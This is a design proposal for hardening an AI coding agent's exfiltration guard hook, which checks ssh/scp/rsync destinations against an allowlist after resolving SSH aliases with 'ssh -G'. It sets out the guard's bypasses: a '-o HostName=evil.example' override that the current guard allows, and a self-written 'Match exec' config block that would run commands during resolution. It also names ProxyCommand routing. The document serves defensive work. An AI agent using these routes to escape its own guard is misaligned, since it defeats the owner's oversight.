---
status: proposed
created: 2026-11-27
closed:
tracker: [7f7b02cb-0001-460e-82d0-35e6cdba4486]
---

# Exfiltration guard: resolve SSH config aliases before checking the host allowlist

**Tracker task:** `7f7b02cb-0001-460e-82d0-35e6cdba4486` — "Exfiltration guard: resolve SSH config aliases before checking the host allowlist"
**Release:** Common 0.78

## Motivation

The exfiltration guard permits ssh/scp/sftp/rsync only to hosts named in
`.claude/hooks/exfil-allowlist.txt` (the `[lab-hosts]` section). It matches the
**literal destination token** against that allowlist. But an SSH config alias is
not the host it names: a node whose `~/.ssh/config` defines `Host amd-halo-ci`
with `HostName amd-halo` is, to ssh, a reference to the allowlisted lab host —
yet the guard sees the string `amd-halo-ci`, finds no allowlist entry for it, and
blocks `ssh amd-halo-ci`.

This was reported as harness feedback by the agent on
`project/task-20261029-080142` (PR #781): the alias was the node's standard way
to reach an allowlisted Linux box, and the block prevented that agent from
reproducing a Linux-only CI crash. The guard's intended posture — permissive for
machines the owner controls and has allowlisted — is defeated by an alias that is
only cosmetic indirection to one of those very machines.

The fix is to resolve the destination the way ssh itself does, through
`ssh -G <alias>`, before matching the allowlist, while preserving fail-closed
behaviour: an alias that resolves to a non-allowlisted host, or that jumps/proxies
through one, is still blocked, and any failure to resolve falls back to today's
literal match so the change cannot become more permissive by accident.

## Scope

A `.claude/hooks` change only, plus its tests and a short note in the guard's
design doc. Concretely:

1. **`.claude/hooks/lib/exfil_bash_network.py`** — in `_check_ssh_family`, resolve
   each ssh-family destination host through `ssh -G` before the existing
   `_require_lab` allowlist match, considering the resolved `hostname`,
   `proxyjump` and `proxycommand`. On any resolution failure, fall back to the
   current literal match.
2. **A new sibling test module** `.claude/hooks/lib/test_exfiltration_guard_ssh_alias.py`,
   built on the shared `GuardFixture` imported from
   `test_exfiltration_guard_check.py`, covering the four cases the task names.
3. **`docs/internals/exfiltration-guard.md`** — one or two sentences recording
   that ssh-family destinations are resolved through `ssh -G` before the allowlist
   match (the doc currently states only that ssh-family handling lives in
   `exfil_bash_network.py`).

Out of scope (and why):

- The curl/wget URL path, raw-socket tools (`nc`/`socat`/…), probe tools and the
  `git push`/`gh` host checks. None of them resolve a destination through SSH
  config, so alias resolution does not apply; touching them would widen the change
  beyond the task.
- The allowlist file format and its `[lab-hosts]`/`[git-remotes]`/`[ar-servers]`
  sections. Unchanged — aliases are resolved *to* hosts that are then matched by
  the existing `Allowlist.is_lab_host`.

## Approach

### Where the behaviour belongs

`_check_ssh_family(prog, argv, ctx)` in `exfil_bash_network.py` is the single place
that turns an ssh/scp/sftp/rsync command into a list of destination hosts and
calls `_require_lab(host, prog, ctx)` on each. The alias resolution belongs here,
as a transform applied to each collected host immediately before `_require_lab`.
`_require_lab` and `Allowlist.is_lab_host` stay exactly as they are — they keep
deciding whether a *hostname* is allowlisted; the new step only changes what
hostname they are asked about.

The guard already shells out to a trusted binary (the `Git` wrapper runs
`subprocess.run(["git", …])` with a timeout and converts every failure to a
block). The alias resolver follows the same shape with `ssh -G`.

### The resolver

Add a module-private helper, resolving one destination token:

```
def _resolve_ssh_destination(token, options, prog, ctx) -> list[str]:
    """Hosts the allowlist must clear for this destination: the resolved
    HostName plus any ProxyJump hop, or [token] unchanged if ssh -G cannot
    resolve it."""
```

Behaviour:

- Locate ssh with `shutil.which("ssh")`. If absent, return `[token]` (literal
  fallback).
- Run `ssh -G <resolution-args> <alias-without-user@-or-:port>` with a short
  timeout and captured output, mirroring the `Git.run` error handling: any
  `OSError`/`SubprocessError`/timeout, or a non-zero exit, returns `[token]`
  (literal fallback). `ssh -G` only prints the effective configuration; it does
  not open a connection — but it is not fully side-effect-free, because it
  evaluates `Match exec "<command>"` blocks in the config, which run a local
  command during resolution. See open question #4.
- Parse the `key value` lines of the output (ssh prints keys lowercased, one per
  line). Read `hostname`, `proxyjump`, `proxycommand`.
- If `proxycommand` is present and not `none`, the session is routed through an
  arbitrary command whose destination cannot be verified — raise a block, exactly
  as the existing command-line `-o ProxyCommand` check does. (This closes the
  config-defined equivalent of that already-refused option.)
- If `proxyjump` is present and not `none`, each hop must itself be allowlisted:
  resolve each hop's hostname the same way (`ssh -G` on the hop spec) and include
  the resolved hop hostname in the returned list so `_require_lab` checks it. A
  hop that cannot be resolved falls back to its literal hop token (still matched,
  so a non-allowlisted jump host is blocked).
- Return `[resolved_hostname] + resolved_hop_hosts`.

Then in `_check_ssh_family`, replace the final

```
for host in hosts:
    _require_lab(host, prog, ctx)
```

with a pass that expands each host through `_resolve_ssh_destination` and calls
`_require_lab` on every resolved host. The returned audit string should report the
hosts actually checked.

### Faithful resolution and its options

`ssh -G` honours the same config-selecting options the real command would, so the
resolver must pass through the ssh options that affect which host config applies —
notably `-F <configfile>` and host-affecting `-o` settings already collected in
`options` by `_ssh_positionals` — while never passing through an option that could
itself route the session (`-o ProxyCommand=`/`ProxyJump=` are already refused before
resolution, so they never reach the resolver). scp/sftp use `-F`/`-o` with the same
meaning; rsync's transport-substituting `-e`/`--rsh` and `RSYNC_RSH` are already
refused upstream, so rsync-over-ssh destinations reach the resolver as plain
`[user@]host:path` specs.

Forwarding the host-affecting `-o` settings is **correctness-critical, not merely a
fidelity nicety**, because today's literal guard already has a hole that
under-forwarding would leave open. `_check_ssh_family` matches only the positional host
token, so `ssh -o HostName=evil.example amd-halo` is **allowed today**: the guard
checks `amd-halo` (allowlisted), while real ssh — reading the same `-o HostName=` —
connects to `evil.example`. If the resolver forwards `-o HostName=`/`-o Port=` to
`ssh -G`, `ssh -G` reports `evil.example` and the guard correctly blocks. A resolver
that drops those options would resolve under a weaker configuration than the real
command and preserve the hole. So the forwarded set must cover exactly the
host/config-selecting options the real command uses, while continuing to refuse the
routing options (`-o ProxyCommand=`/`ProxyJump=`) before resolution.

The exact set of options to forward to `ssh -G` is a detail to pin down during
implementation (see open questions); the safe default is to forward `-F` and the
host/config-selecting `-o` values (`HostName`, `Port`, `User`, and the like) and
nothing that routes the session.

### Why this is not a new exfiltration vector

The ssh binary the resolver runs (`shutil.which("ssh")`) is the same ssh that will
execute the real command afterwards, reading the same `~/.ssh/config`. If an
environment could make `ssh -G` report a false hostname, that same environment
already controls where the real `ssh` connects — so resolution introduces no
discrepancy an attacker could exploit, and the guard's existing fail-closed
posture is preserved: resolution only ever *adds* a block (a bad HostName,
ProxyJump or ProxyCommand) or defers to the literal match it replaces.

One caveat qualifies this and is tracked as open question #4: `ssh -G` evaluates
`Match exec` config blocks, so a config that defines one makes resolution run a
local command. For a command the guard would *allow*, that command would run
anyway when the real `ssh` executes, so nothing new happens. For a command the
guard would *block*, resolution runs the `Match exec` command once that the
blocked `ssh` never would — and because the guard's threat model is the
assistant itself, an assistant that writes its own `~/.ssh/config` could use
that to run a command via the guard's resolution call even on a destination the
guard denies. The implementer must decide how to handle this before resolving
(see open question #4).

### Testing seam

The tests need deterministic `ssh -G` output without a real SSH config. The
faithful, least-mocking approach: the fixture writes a small fake `ssh`
executable into a temp directory and prepends it to `PATH` for the duration of the
test, so `shutil.which("ssh")` finds it and it emits canned `-G` output keyed on
the alias argument (and exits non-zero for the "resolution failure" case). This
exercises the real subprocess path end to end. A new sibling module is used rather
than extending `test_exfiltration_guard_check.py`, which is already 1591 lines
against the 1600-line hard limit; the existing `test_exfiltration_guard_transport.py`
establishes the sibling-module-on-shared-`GuardFixture` pattern, and CI already
discovers `test_exfiltration_guard_*.py`.

## Success criteria

A reviewer confirms the task is done when:

- `ssh amd-halo-ci`, where the fake config maps `amd-halo-ci`'s HostName to the
  allowlisted `amd-halo`, is **allowed** — the originally reported case.
- `ssh evil-alias`, mapping to a non-allowlisted HostName, is **blocked** with the
  existing "not an allowlisted lab host" reason.
- An alias whose `ProxyJump` resolves to a non-allowlisted host is **blocked**
  (and, symmetrically, a `ProxyCommand`-bearing alias is blocked as unverifiable).
- `ssh -o HostName=evil.example amd-halo`, where the command line overrides the
  resolved host to a non-allowlisted one, is **blocked** — the host/config-selecting
  `-o` option is forwarded to `ssh -G`, so the guard checks `evil.example`, not the
  positional `amd-halo`. (This case is **allowed** on the base branch, so it is the
  regression test for the forwarding requirement in open question #1.)
- When `ssh -G` fails (fake ssh exits non-zero, or ssh is absent), the guard falls
  back to a literal match: an allowlisted literal (`ssh amd-halo`) is still
  allowed and a non-allowlisted literal (`ssh evil.example`) is still blocked —
  i.e. identical to today's behaviour.
- The same four cases hold for `scp`/`rsync`-over-ssh destinations.
- The existing ssh/scp/rsync tests in `test_exfiltration_guard_check.py` and
  `test_exfiltration_guard_transport.py` still pass unchanged (no regression to
  literal allowlisted hosts, jump-host `-J` handling, or the transport-env
  refusals).

Tests to run:

```
python3 -m pytest .claude/hooks/lib/test_exfiltration_guard_ssh_alias.py -q
python3 -m pytest .claude/hooks/lib/test_exfiltration_guard_transport.py -q
```

and the ssh-family cases of `test_exfiltration_guard_check.py`
(`BashNetworkTests::test_rsync_and_ssh_honour_allowlist` and the surrounding
network tests). CI runs all `test_exfiltration_guard_*.py` modules via
`python3 -m unittest discover`.

## Dependencies

- None on other tracker tasks (`blocked_by` is empty).
- **Owner sanction on the implementing job.** This edits files under
  `.claude/hooks`, which are protected: the implementation job must carry the
  owner's explicit `skip_agent_permission_prompts` / sensitive-file bypass, and
  the agent must not route around the hook that protects these files. The
  `verify-exfiltration-guard.sh` CI check compares the guard against the base
  branch off non-`ci/` branches; the reviewer should confirm how that check treats
  this change (it is a guard-library change, not a workflow-file change, so it is
  not under the CI-file lock, but the design-doc and verifier interaction should
  be checked at implementation time — see open questions).

## Open questions

1. **Which ssh options to forward to `ssh -G`.** The safe default is `-F` and the
   host/config-selecting `-o` values. The asymmetry is not symmetric in risk:
   forwarding more risks surprising interactions, but forwarding *less* leaves the
   `-o HostName=` hole described under "Faithful resolution" open — a real
   correctness/security gap, not merely resolution under a different config. The
   implementer should settle the exact set against the `_SSH_VALUE_FLAGS` set,
   confirm `HostName`/`Port` are among those forwarded, and note the decision in the
   resolver's docstring.
2. **ProxyJump recursion depth.** One level of resolution (resolve the alias, then
   resolve each named jump hop once) covers the reported need and the task's four
   cases. A jump host that is itself defined only via a further ProxyJump chain is
   an edge case; the proposal resolves each hop once and falls back to the literal
   hop token otherwise, which stays fail-closed. Confirm one level is acceptable.
3. **`verify-exfiltration-guard.sh` base-branch comparison.** Confirm this guard
   change passes that CI check on a non-`ci/` branch (it checks presence/
   registration and, off `ci/`, no change against base — the reviewer should
   verify whether a guard-*library* edit trips it or only workflow-file edits do).
   If it would block the change, that is a dependency to resolve before
   implementation, not a reason to weaken the check.
4. **`Match exec` side effects of `ssh -G`.** `ssh -G` does not open a
   connection, but it does evaluate `Match exec "<command>"` config blocks,
   which run a local command during resolution. Because the guard's threat
   model is the assistant itself (`docs/internals/exfiltration-guard.md`), an
   assistant that writes its own `~/.ssh/config` with a `Match exec` directive
   could have the guard execute that command via the resolution call — even for
   a destination the guard ultimately blocks, where the real `ssh` would never
   run it. Options to weigh at implementation time: accept the risk on the
   grounds that the assistant already runs arbitrary local commands by other
   means and resolution only shifts *when* a self-authored `Match exec` fires;
   or run `ssh -G` with the config forced to a known-safe source (for example
   `-F /dev/null`, which also defeats the alias resolution the task needs, so
   this is a trade-off, not a free mitigation). Note that there is no `ssh -G`
   flag that evaluates `Match` without its `exec` predicate. Settle this before
   resolving, since it bears directly on whether resolution is safe to run on
   commands that will be blocked.

## Estimated complexity

**Small.** One focused function added to `exfil_bash_network.py`, a small change
to `_check_ssh_family`'s final loop, one new test module, and a two-sentence doc
note. No API changes, no new module, no production-code changes outside the hook
library.
